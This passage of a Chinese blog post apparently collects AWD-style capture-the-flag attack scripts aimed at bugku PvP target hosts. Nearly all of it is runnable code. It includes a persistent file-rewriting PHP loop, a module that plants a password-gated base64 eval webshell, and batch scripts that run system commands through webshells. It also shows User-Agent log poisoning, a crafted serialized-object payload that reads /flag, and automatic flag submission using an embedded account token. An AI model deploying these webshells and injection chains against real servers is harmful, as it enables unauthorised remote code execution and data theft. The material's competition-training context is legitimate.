    \<span class="token variable">$code</span> = 'flag&#123;You shall die!&#125;';

    while (1)&#123;
        file_put_contents(\<span class="token variable">$file</span>,\<span class="token variable">$code</span>);
        system('touch -m -d <span class="token entity" title="\&quot;">\"</span>2018-12-01 09:10:12<span class="token entity" title="\&quot;">\"</span> <span class="token variable">$evil</span>');
        usleep(10);
    &#125;
?>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$php_code2</span>"</span> <span class="token operator">></span> <span class="token string">"<span class="token variable">$webapp</span>/killshell.php"</span>
<span class="token function">curl</span> <span class="token string">"http://localhost/killshell.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h2 id="拿shell了交个flag先"><a href="#拿shell了交个flag先" class="headerlink" title="拿shell了交个flag先"></a>拿shell了交个flag先</h2><h3 id="预留后门模块"><a href="#预留后门模块" class="headerlink" title="预留后门模块"></a>预留后门模块</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#预置后门利用模块</span>
<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">backdoor_writeshell</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> route<span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># &lt;?php echo "result:";if(md5($_GET["pass"])=="edee85b6d1da959d5fa73ce6ebde9c72")&#123;@eval($_POST[a]);&#125; ?></span>
    base64_data_1 <span class="token operator">=</span> <span class="token string">"PD9waHAgZWNobyAicmVzdWx0OiI7aWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iZWRlZTg1YjZkMWRhOTU5ZDVmYTczY2U2ZWJkZTljNzIiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4="</span>
    targetUrl <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> ip <span class="token operator">+</span> route
    payload <span class="token operator">=</span> <span class="token string">'file_put_contents("/var/www/html/include/.write.php",base64_decode("'</span> <span class="token operator">+</span> base64_data_1 <span class="token operator">+</span> <span class="token string">'"));'</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>secret<span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        shellurl <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span></span><span class="token string">/include/.write.php"</span></span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>targetUrl<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"result"</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl <span class="token operator">+</span> <span class="token string">"?pass=0w0"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] writeshell success --- Box: "</span> <span class="token operator">+</span> ip<span class="token punctuation">)</span>

            payload2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag.txt');"</span><span class="token punctuation">&#125;</span>
            res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shellurl <span class="token operator">+</span> <span class="token string">"?pass=0w0"</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> res2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] getshell了，交个flag先 "</span> <span class="token operator">+</span> res2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Failed! backdoor_writeshell Box: "</span> <span class="token operator">+</span> ip<span class="token punctuation">)</span>


backdoor_writeshell<span class="token punctuation">(</span><span class="token string">"localhost:18894"</span><span class="token punctuation">,</span> <span class="token string">"/include/shell.php"</span><span class="token punctuation">,</span> <span class="token string">"admin_ccmd"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<p>批量拿flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">#coding=utf-8</span>
<span class="token keyword">import</span> sys<span class="token punctuation">,</span>requests<span class="token punctuation">,</span>base64

<span class="token keyword">def</span> <span class="token function">loadfile</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span> <span class="token punctuation">:</span> 
        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">:</span> 
        <span class="token keyword">print</span> <span class="token string">"File %s Not Found!"</span> <span class="token operator">%</span>filepath
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">file_write</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span>filecontent<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>filecontent<span class="token punctuation">)</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>method<span class="token punctuation">,</span>passwd<span class="token punctuation">,</span>flag_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#flag机的url</span>
    flag_url<span class="token operator">=</span><span class="token string">"192.168.45.1"</span>
    <span class="token comment">#print url</span>
    <span class="token comment">#判断shell是否存在</span>
    <span class="token keyword">try</span> <span class="token punctuation">:</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">:</span> 
        <span class="token keyword">print</span> <span class="token string">"[-] %s ERR_CONNECTION_TIMED_OUT"</span> <span class="token operator">%</span>url
        file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span><span class="token string">"[-] %s ERR_CONNECTION_TIMED_OUT\n\n"</span> <span class="token operator">%</span>url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span> <span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"[-] %s Page Not Found!"</span> <span class="token operator">%</span>url
        file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span><span class="token string">"[-] %s Page Not Found!\n\n"</span> <span class="token operator">%</span>url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token comment">#执行命令来获取flag system,exec,passthru,`,shell_exec</span>
    <span class="token comment">#a=@eval(base64_decode($_GET[z0]));&amp;z0=c3lzdGVtKCJ3aG9hbWkiKTs=</span>
    cmd <span class="token operator">=</span> <span class="token string">"curl "</span><span class="token operator">+</span>flag_url
    <span class="token comment">#cmd = "whoami"</span>
    getflag_cmd <span class="token operator">=</span><span class="token string">"echo system(\"%s\");"</span><span class="token operator">%</span>cmd
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> method<span class="token operator">==</span><span class="token string">'get'</span><span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>passwd<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'@eval(base64_decode($_GET[z0]));'</span>
        data<span class="token punctuation">[</span><span class="token string">'z0'</span><span class="token punctuation">]</span><span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>getflag_cmd<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token comment">#print res.url</span>
            <span class="token keyword">if</span> res<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
                content <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"\n"</span><span class="token operator">+</span>res<span class="token punctuation">.</span>content<span class="token operator">+</span><span class="token string">"\n\n"</span>
                file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span>content<span class="token punctuation">)</span>
                <span class="token keyword">print</span> <span class="token string">"[+] %s getflag sucessed!"</span><span class="token operator">%</span>url
            <span class="token keyword">else</span> <span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">"[-] %s cmd exec response is null!"</span><span class="token operator">%</span>url
                content <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"\ncmd exec response is null!\n\n"</span>
                file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span>content<span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">:</span>
            file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span><span class="token string">"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"</span><span class="token operator">%</span>url<span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">"[+] %s Getflag Failed! You can check the shell's passwd!"</span><span class="token operator">%</span>url
    <span class="token keyword">elif</span> method<span class="token operator">==</span><span class="token string">'post'</span><span class="token punctuation">:</span>
        data<span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'Sn3rtf4ck'</span>
        data<span class="token punctuation">[</span>passwd<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'@eval(base64_decode($_POST[z0]));'</span>
        data<span class="token punctuation">[</span><span class="token string">'z0'</span><span class="token punctuation">]</span><span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>getflag_cmd<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> res<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
                content <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"\n"</span><span class="token operator">+</span>res<span class="token punctuation">.</span>content<span class="token operator">+</span><span class="token string">"\n\n"</span>
                file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span>content<span class="token punctuation">)</span>
                <span class="token keyword">print</span> <span class="token string">"[+] %s getflag sucessed!"</span><span class="token operator">%</span>url
            <span class="token keyword">else</span> <span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">"[-] %s cmd exec response is null!"</span><span class="token operator">%</span>url
                content <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"\ncmd exec response is null!\n\n"</span>
                file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span>content<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span><span class="token string">"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"</span><span class="token operator">%</span>url<span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">"[+] %s Getflag Failed! You can check the shell's passwd!"</span><span class="token operator">%</span>url



<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token comment">#存放flag的文件</span>
    flag_path<span class="token operator">=</span><span class="token string">"./flag.txt"</span>
    shellstr<span class="token operator">=</span>loadfile<span class="token punctuation">(</span><span class="token string">"./webshell.txt"</span><span class="token punctuation">)</span>
    <span class="token builtin">list</span> <span class="token operator">=</span> shellstr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>
    <span class="token comment">#print str(list)</span>
    i <span class="token operator">=</span> <span class="token number">0</span>
    url<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    passwd<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    method<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> data <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> data<span class="token punctuation">:</span>
            ls <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span>
            method_tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            method_tmp <span class="token operator">=</span> method_tmp<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> method_tmp<span class="token operator">==</span><span class="token string">'post'</span> <span class="token keyword">or</span> method_tmp<span class="token operator">==</span><span class="token string">'get'</span><span class="token punctuation">:</span>
                url<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                method<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>method_tmp
                passwd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                i<span class="token operator">+=</span><span class="token number">1</span>
            <span class="token keyword">else</span> <span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">"[-] %s request method error!"</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                file_write<span class="token punctuation">(</span>flag_path<span class="token punctuation">,</span><span class="token string">"[-] %s request method error!\n\n"</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
    <span class="token comment">#print str(len(url))</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment">#调用执行命令的模块</span>
        <span class="token comment">#print str(j)</span>
        <span class="token comment">#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])</span>
        getflag<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>method<span class="token operator">=</span>method<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>passwd<span class="token operator">=</span>passwd<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>flag_path<span class="token operator">=</span>flag_path<span class="token punctuation">)</span>
 <span class="token keyword">print</span> <span class="token string">"Getflag finished!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>批量交flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> json
<span class="token keyword">import</span> time


<span class="token keyword">def</span> <span class="token function">shell_exp</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    att_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/template/default/index/ind1x.php?s=system('cat /flag');"</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span><span class="token punctuation">&#125;</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>att_url<span class="token punctuation">)</span>
        flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag&#123;.*&#125;'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">"  Box: "</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">" by shell_exp"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flag
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]Failed! shell_exp   Box: "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>


<span class="token keyword">def</span> <span class="token function">deadshell</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    att_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/public/common/images/1.jpg.php?s=eval('file_put_contents(\\'/var/www/html/-2.php\\',base64_decode(\\'PD9waHAgZWNobyAicmVzdWx0OiI7aWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iYzRjYTQyMzhhMGI5MjM4MjBkY2M1MDlhNmY3NTg0OWIiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4=\\'));');"</span>
    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>att_url<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span><span class="token punctuation">&#125;</span>
        deadurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/-2.php?pass=1"</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>deadurl<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'result:flag&#123;.*&#125;'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">"  Box: "</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">" by deadshell"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flag
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]Failed! deadshell   Box: "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>


<span class="token keyword">def</span> <span class="token function">log_exp</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    writelog_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/index.php"</span>
    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php @eval($_POST[111]);?>'</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>writelog_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">'system("cat /f*");'</span><span class="token punctuation">&#125;</span>
        att_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/log.php"</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>att_url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'ISCTF&#123;.*&#125;'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">"  Box: "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> flag
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]Failed! log_exp   Box: "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>


<span class="token keyword">def</span> <span class="token function">unserialize_exp</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    att_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/common/home.php"</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"a"</span><span class="token punctuation">:</span>
            <span class="token string">"Tzo0OiJob21lIjoyOntzOjEyOiIAaG9tZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGhvbWUAYXJncyI7YToxOntpOjA7czoxNjoiMXxjYXQke0lGU30vZmxhZyI7fX0="</span>
        <span class="token punctuation">&#125;</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>att_url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'ISCTF&#123;.*&#125;'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">"  Box: "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> flag
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]Failed! unserialize_exp    Box: "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>


<span class="token keyword">def</span> <span class="token function">submit_flag</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    submit_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://ctf.bugku.com/pvp/submit.html?token=3408e4efa1c92d11663a725c6bb060f8&amp;flag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
    <span class="token comment"># headers = &#123;"Content-Type": "application/json",</span>
    <span class="token comment">#            "Authorization": "45b89011c769b3887141d4abdcdc9207"</span>
    <span class="token comment">#            &#125;</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token punctuation">:</span> flag<span class="token punctuation">&#125;</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>submit_url<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"正确"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span> <span class="token operator">+</span> <span class="token string">"交个flag先"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]"</span> <span class="token operator">+</span> <span class="token string">"交过了"</span><span class="token punctuation">)</span>


url <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'http://192-168-1-5.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-6.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-76.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-27.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-22.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-18.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-60.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-248.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-219.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-239.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-143.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-77.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-119.pvp4121.bugku.cn'</span><span class="token punctuation">,</span>
    <span class="token string">'http://192-168-1-136.pvp4121.bugku.cn'</span>
<span class="token punctuation">]</span>  <span class="token comment"># 匹配攻击靶机ip</span>
count <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> url<span class="token punctuation">:</span>  <span class="token comment"># 攻击数量</span>
        attack_url <span class="token operator">=</span> i
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>deadshell<span class="token punctuation">(</span>attack_url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            submit_flag<span class="token punctuation">(</span>deadshell<span class="token punctuation">(</span>attack_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>shell_exp<span class="token punctuation">(</span>attack_url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            submit_flag<span class="token punctuation">(</span>shell_exp<span class="token punctuation">(</span>attack_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
